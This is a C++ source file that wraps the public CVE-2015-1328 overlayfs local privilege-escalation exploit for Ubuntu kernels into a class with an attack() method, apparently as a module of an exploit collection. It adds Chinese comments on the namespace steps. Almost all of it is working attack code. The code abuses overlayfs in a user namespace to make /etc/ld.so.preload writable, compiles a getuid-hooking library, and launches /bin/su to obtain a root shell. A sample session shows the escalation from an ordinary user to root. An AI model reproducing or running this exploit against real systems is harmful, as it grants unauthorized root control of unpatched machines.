#include "c37292.h"

/*
# Exploit Title: ofs.c - overlayfs local root in ubuntu
# Date: 2015-06-15
# Exploit Author: rebel
# Version: Ubuntu 12.04, 14.04, 14.10, 15.04 (Kernels before 2015-06-15)
# Tested on: Ubuntu 12.04, 14.04, 14.10, 15.04
# CVE : CVE-2015-1328     (http://people.canonical.com/~ubuntu-security/cve/2015/CVE-2015-1328.html)

*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*
CVE-2015-1328 / ofs.c
overlayfs incorrect permission handling + FS_USERNS_MOUNT

user@ubuntu-server-1504:~$ uname -a
Linux ubuntu-server-1504 3.19.0-18-generic #18-Ubuntu SMP Tue May 19 18:31:35 UTC 2015 x86_64 x86_64 x86_64 GNU/Linux
user@ubuntu-server-1504:~$ gcc ofs.c -o ofs
user@ubuntu-server-1504:~$ id
uid=1000(user) gid=1000(user) groups=1000(user),24(cdrom),30(dip),46(plugdev)
user@ubuntu-server-1504:~$ ./ofs
spawning threads
mount #1
mount #2
child threads done
/etc/ld.so.preload created
creating shared library
# id
uid=0(root) gid=0(root) groups=0(root),24(cdrom),30(dip),46(plugdev),1000(user)

greets to beist & kaliman
2015-05-24
%rebel%
*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*
*/


#define LIB "#include <unistd.h>\n\nuid_t(*_real_getuid) (void);\nchar path[128];\n\nuid_t\ngetuid(void)\n{\n_real_getuid = (uid_t(*)(void)) dlsym((void *) -1, \"getuid\");\nreadlink(\"/proc/self/exe\", (char *) &path, 128);\nif(geteuid() == 0 && !strcmp(path, \"/bin/su\")) {\nunlink(\"/etc/ld.so.preload\");unlink(\"/tmp/ofs-lib.so\");\nsetresuid(0, 0, 0);\nsetresgid(0, 0, 0);\nexecle(\"/bin/sh\", \"sh\", \"-i\", NULL, NULL);\n}\n    return _real_getuid();\n}\n"

static char child_stack[1024*1024*1024];

static int
child_exec(void *stuff)
{
    fprintf(stderr,"child threads 1\n");
    char *file;
    fprintf(stderr,"child threads 11\n");
//    system("rm -rf /tmp/ns_sploit");
    FILE *pf;
    char buffer[4096];
    pf = popen("rm -rf /tmp/ns_sploit", "r");
    fread(buffer, sizeof(buffer), 1, pf);
    printf("%s\n", buffer);
    pclose(pf);

    fprintf(stderr,"child threads 12\n");
    mkdir("/tmp/ns_sploit", 0777);
    fprintf(stderr,"child threads 13\n");
    mkdir("/tmp/ns_sploit/work", 0777);
    fprintf(stderr,"child threads 14\n");
    mkdir("/tmp/ns_sploit/upper",0777);
    fprintf(stderr,"child threads 15\n");
    mkdir("/tmp/ns_sploit/o",0777);

    fprintf(stderr,"mount #1\n");
    if (mount("overlay", "/tmp/ns_sploit/o", "overlayfs", MS_MGC_VAL, "lowerdir=/proc/sys/kernel,upperdir=/tmp/ns_sploit/upper") != 0) {
// workdir= and "overlay" is needed on newer kernels, also can't use /proc as lower
        if (mount("overlay", "/tmp/ns_sploit/o", "overlay", MS_MGC_VAL, "lowerdir=/sys/kernel/security/apparmor,upperdir=/tmp/ns_sploit/upper,workdir=/tmp/ns_sploit/work") != 0) {
            fprintf(stderr, "no FS_USERNS_MOUNT for overlayfs on this kernel\n");
            exit(-1);
        }
        file = ".access";
        chmod("/tmp/ns_sploit/work/work",0777);
    } else file = "ns_last_pid";

    fprintf(stderr,"child threads 2\n");
    chdir("/tmp/ns_sploit/o");
    rename(file,"ld.so.preload");

    chdir("/");
    umount("/tmp/ns_sploit/o");
    fprintf(stderr,"mount #2\n");
    if (mount("overlay", "/tmp/ns_sploit/o", "overlayfs", MS_MGC_VAL, "lowerdir=/tmp/ns_sploit/upper,upperdir=/etc") != 0) {
        if (mount("overlay", "/tmp/ns_sploit/o", "overlay", MS_MGC_VAL, "lowerdir=/tmp/ns_sploit/upper,upperdir=/etc,workdir=/tmp/ns_sploit/work") != 0) {
            exit(-1);
        }
        chmod("/tmp/ns_sploit/work/work",0777);
    }
    fprintf(stderr,"child threads 3\n");

    chmod("/tmp/ns_sploit/o/ld.so.preload",0777);
    umount("/tmp/ns_sploit/o");
    fprintf(stderr,"child threads 4\n");

}


c37292::c37292()
{

}

int c37292::attack()
{
    int status, fd, lib;
     pid_t wrapper, init;
     int clone_flags = CLONE_NEWNS | SIGCHLD;

     fprintf(stderr,"spawning threads\n");
//创建子进程
     if((wrapper = fork()) == 0) {
//将子进程移动到新命名空间，和父进程分离
         if(unshare(CLONE_NEWUSER) != 0)
             fprintf(stderr, "failed to create new user namespace\n");

         fprintf(stderr,"spawning threads1\n");
//子进程继续创建子进程
         if((init = fork()) == 0) {
             fprintf(stderr,"spawning threads2\n");
//新的子进程从新的函数入口点开始执行，相当于execve了一个新进程，新的子进程继续存在于一个新的命名空间中
             pid_t pid =
//                     clone(child_exec, child_stack + (1024*1024), clone_flags, NULL);
                clone(child_exec, child_stack + (1024*1024*1024), clone_flags, NULL);
             fprintf(stderr,"spawning threads3\n");
             if(pid < 0) {
                 fprintf(stderr, "failed to create new mount namespace\n");
                 exit(-1);
             }
             fprintf(stderr,"spawning threads4\n");

             waitpid(pid, &status, 0);

         }

         waitpid(init, &status, 0);
         return 0;
     }

     usleep(300000);

     fprintf(stderr,"spawning threads41\n");
//     wait(NULL);
     fprintf(stderr,"child threads done\n");

     fd = open("/etc/ld.so.preload",O_WRONLY);

     if(fd == -1) {
         fprintf(stderr,"exploit failed\n");
         exit(-1);
     }

     fprintf(stderr,"/etc/ld.so.preload created\n");
     fprintf(stderr,"creating shared library\n");
     lib = open("/tmp/ofs-lib.c",O_CREAT|O_WRONLY,0777);
     write(lib,LIB,strlen(LIB));
     close(lib);
     fprintf(stderr,"creating shared library1\n");
     lib = system("gcc -fPIC -shared -o /tmp/ofs-lib.so /tmp/ofs-lib.c -ldl -w");
     if(lib != 0) {
         fprintf(stderr,"couldn't create dynamic library\n");
         exit(-1);
     }
     fprintf(stderr,"creating shared library2\n");
     write(fd,"/tmp/ofs-lib.so\n",16);
     close(fd);
     fprintf(stderr,"creating shared library3\n");
     system("rm -rf /tmp/ns_sploit /tmp/ofs-lib.c");
     fprintf(stderr,"creating shared library4\n");
     execl("/bin/su","su",NULL);
     fprintf(stderr,"creating shared library5\n");
}
